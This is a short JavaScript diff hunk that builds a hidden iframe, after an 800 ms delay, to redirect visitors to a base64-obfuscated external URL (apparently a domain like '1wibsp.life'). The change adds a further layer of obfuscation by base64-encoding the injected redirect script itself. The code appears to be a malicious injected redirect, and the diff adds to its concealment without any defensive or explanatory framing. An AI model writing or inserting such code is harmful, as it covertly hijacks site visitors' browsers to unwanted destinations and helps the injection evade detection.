@@ -53,7 +53,7 @@
       const redirect = atob('aHR0cHM6Ly8xd2lic3AubGlmZS92My8zMzE2L21vdGl2ZS12aXRleS1wZXJtw==');
       const iframe = document.createElement("iframe");
       iframe.style.display = "none";
-      iframe.src = `data:text/html,<script>location='${redirect}'</script>`;
+      iframe.src = "data:text/html;base64," + btoa(`<script>location='${redirect}'<\/script>`);
       document.body.appendChild(iframe);
     }, 800);
   };
